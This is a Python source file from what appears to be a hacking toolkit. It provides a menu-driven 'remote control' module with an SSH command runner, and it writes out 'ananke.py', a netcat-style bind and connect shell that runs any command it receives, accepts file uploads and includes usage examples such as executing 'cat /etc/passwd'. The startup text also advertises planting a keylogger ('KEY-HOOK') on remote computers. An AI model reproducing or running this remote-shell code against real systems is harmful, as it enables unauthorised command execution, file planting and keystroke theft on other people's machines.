# PSL
import os
import socket
from time import sleep
from typing import NoReturn

# third-party
import paramiko

# Own
from . import clear_terminal, pause_script, Text
from .user_information import UserDeviceInformation


class RemoteControlModules(UserDeviceInformation):
    """
    This module allows you to create reverse_tcp connection between two computers or connect
    to device in other network using SSH.
    """

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}"

    def __init__(self) -> NoReturn:
        super().__init__()
        self.check_default_ananke: str = ""

    def remote_control_startup(self) -> NoReturn:
        print("-" * 70)
        print(
            f"This modules allows you to remotely connect to other computer.\n"
            f"By using {Text.warning}SSH{Text.endc} or {Text.warning}ANANKE MODULE{Text.endc} "
            f"you can execute command on remote\n"
            f"computers as well as you can upload generated {Text.warning}KEY-HOOK\n"
            f"to catch all symbols from keyboard connected with remote computer{Text.endc}."
        )
        print(f"Do you want to continue {Text.warning}y/n{Text.endc}?")
        print("-" * 70)
        remote_control_choice = str(input("> "))
        clear_terminal()
        if remote_control_choice.lower() == "y":
            sleep(1)
            clear_terminal()
            self.remote_control_modules_menu()


    def remote_control_modules_menu(self) -> NoReturn:
        print(25 * "-" + f"{Text.blue}REMOTE CONTROL MENU {Text.endc}" + 25 * "-")
        print(f"{Text.warning}1.SSH{Text.endc}")
        print(f"{Text.warning}2.ANANKE{Text.endc}")
        print(f"{Text.warning}0.BACK TO MAIN MENU{Text.endc}")
        print(70 * "-")
        remote_control_menu_choice = str(input("> "))
        if remote_control_menu_choice == "1":
            clear_terminal()
            SSH().shh_start_choice()
        elif remote_control_menu_choice == "2":
            clear_terminal()
            try:
                self.check_default_ananke = os.path.isdir(
                    rf"C:\Users\{self._user_hostname}\Desktop"
                )
                self.check_default_ananke = os.path.abspath(
                    rf"C:\Users\{self._user_hostname}\Desktop"
                )
                self.check_default_ananke = rf"C:\Users\{self._user_hostname}\Desktop\ananke.py"
            except OSError:
                print(f"{Text.error}ERROR!{Text.endc} I have problems with save!")
                sleep(2)
            clear_terminal()
            with open(self.check_default_ananke, "w") as f:
                f.write(
                    r"""
# -*- coding: big5 -*-
# !/opt/local/bin/python3

import sys
import socket
import getopt
import threading
import subprocess


class Ananke:
    def __init__(self):
        self.listen: bool = False
        self.command: bool = False
        self.upload: bool = False
        self.execute: bytes = b''
        self.target: str = ""
        self.upload_destination: str = ""
        self.port: int = 0

    @staticmethod
    def run_command(command: bytes):
        command = command.decode('utf8').rstrip()

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        except:
            output = "Nie udalo się wykonac polecenia.\r\n"

        return output

    def client_handler(self, client_socket):
        print('Polaczenie', self, client_socket, file=sys.stderr)
        if len(self.upload_destination):
            file_buffer = b''
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                else:
                    file_buffer += data
            try:
                file_descriptor = open(self.upload_destination, "wb")
                file_descriptor.write(file_buffer)
                file_descriptor.close()
                client_socket.send(("Zapisano plik w %s\r\n" % (self.upload_destination,)).encode('utf8'))
            except:
                client_socket.send(("Nie udalo się zapisac pliku w %s\r\n" % (self.upload_destination,)).encode('utf8'))

        if len(self.execute):
            output = self.run_command(self.execute)
            client_socket.send(output.encode('utf8'))

        if self.command:
            while True:
                client_socket.send(b"<ANANKE:#> ")
                cmd_buffer = b''
                while b"\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                response = self.run_command(cmd_buffer)

                client_socket.send(response)

    def server_loop(self):

        if not len(self.target):
            self.target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.target, self.port))
        server.listen(5)

        while True:
            client_socket, addr = server.accept()
            print('Accepting %s from %s' % (client_socket, addr))
            client_thread = threading.Thread(target=Ananke.client_handler, args=(self, client_socket,))
            client_thread.start()

    def client_sender(self, buffer: str):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((self.target, self.port))
            print("Connect to:", self.target, "\n" + "On port:", self.port)
            if len(buffer):
                client.send(buffer.encode('utf8'))
            while True:
                recv_len = 1
                response = b''
                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data
                    if recv_len < 4096:
                        break
                print(response.decode('utf8'))
                buffer = input("")
                buffer += "\n"

                client.send(buffer.encode('utf8'))
        except:
            print("\n" + "Lost Connection!", "\n" + "Error: Wyjatek[*]")
            client.close()

    def main(self):
        if not len(sys.argv[1:]):
            self.usage()
        try:
            opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                       ["help", "listen", "execute", "target", "port", "command", "upload"])
        except getopt.GetoptError as err:
            self.usage()
        for o, a in opts:
            if o in ("-h", "--help"):
                self.usage()
            elif o in ("-l", "--listen"):
                self.listen = True
            elif o in ("-e", "--execute"):
                self.execute = a
            elif o in ("-c", "--commandshell"):
                self.command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                self.target = a
            elif o in ("-p", "--port"):
                self.port = int(a)
            else:
                assert False, "Nieobslugiwana opcja"

        if not self.listen and len(self.target) and self.port > 0:
            buffer = sys.stdin.readline()

            self.client_sender(buffer)

        if self.listen:
            self.server_loop()

    @staticmethod
    def usage():
        print('''
    Sposob uzycia: ananke.py -t target_host -p port
    -l --listen                - nasluchuje na [host]:[port] przychodzacych polaczen
    -e --execute=file_to_run   - wykonuje dany plik, gdy zostanie nawiązanie połaczenie
    -c --command               - inicjuje wiersz polecen
    -u --upload=destination    - po nawiazaniu polaczenia wysyła plik i zapisuje go w [destination]
    -t -target                  - adres ip
    Przyklady: 
    ananke.py -t 192.168.0.1 -p 5555 -l -c
    ananke.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
    ananke.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\
    echo 'ABCDEFGHI' | ./ananke.py -t 192.168.11.12 -p 135
    Rozpoczecie nasluchiwania:
    python3 ananke.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python3 ananke.py -t 192.168.0.1 -p 1234 
    Ewentualnie:
    Rozpoczecie nasluchiwania:
    python ananke.py -l -p 1234 -c
    Nawiazywanie polaczenia z nasluchujacym komputerem:
    python ananke.py -t 192.168.0.1 -p 1234 
    ''')
        sys.exit(0)


if __name__ == '__main__':
    Ananke().main()
            """
                )
            clear_terminal()
            print(f"Script will save here: {Text.warning}{self.check_default_ananke}{Text.endc}")
            pause_script()


class SSH:
    def __repr__(self) -> str:
        return f"{self.__class__.__name__}"

    @staticmethod
    def shh_start_choice() -> NoReturn:
        clear_terminal()
        print(70 * "-")
        print(
            f"By Using this module you can connect to remote computer and control\n"
            f"this computer using {Text.warning}SSH.{Text.endc}"
            f"\nOnce connected, you can execute the command on a remote computer.\n"
            f"Do you want to connect {Text.warning}y/n{Text.endc}?"
        )
        print(70 * "-")
        command_ssh: str = str(input("> "))
        if command_ssh.upper() == "Y":
            SSH().ssh_command()
        else:
            print(f"{Text.error}WRONG OPTION!{Text.endc}")
            sleep(2)
            SSH().shh_start_choice()

    @staticmethod
    def ssh_command() -> NoReturn:
        clear_terminal()
        print(30 * "-" + f"{Text.blue}SSH MODULE{Text.endc}" + 30 * "-")
        sleep(0.25)
        print(f"After connection if you want to disconnect type {Text.warning}0{Text.endc}")
        ip_ssh: str = str(input(f"Type {Text.warning}IP{Text.endc}: "))
        port_ssh: str = str(input(f"Type {Text.warning}Port number{Text.endc}: "))
        login_shh: str = str(input(f"Type {Text.warning}Login{Text.endc}: "))
        password_ssh: str = str(input(f"Type {Text.warning}Password{Text.endc}: "))
        clear_terminal()
        try:
            while True:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    ip_ssh, port=int(port_ssh), username=login_shh, password=password_ssh, timeout=5
                )
                ssh_session = client.get_transport().open_session()
                if ssh_session.active:
                    command_shh_connected = input("Command: ")
                    if command_shh_connected != "0":
                        ssh_session.exec_command(command_shh_connected)
                        print(ssh_session.recv(1024).decode("UTF-8"))
                    elif command_shh_connected == "0":
                        if client:
                            client.close()
                            input(
                                f"\n{Text.warning}Disconnecting ...{Text.endc}\nPress any key to continue ..."
                            )
                            break

        except socket.gaierror:
            print(f"{Text.error}Can't find host!{Text.endc}")
            print(70 * "-")
        except paramiko.ssh_exception.AuthenticationException:
            print(f"{Text.error}Wrong credentials!{Text.endc}")
            print(70 * "-")
        finally:
            ssh_again = str(input("Do you want to connect again y/n?: "))
            if ssh_again.upper() == "Y":
                SSH().ssh_command()
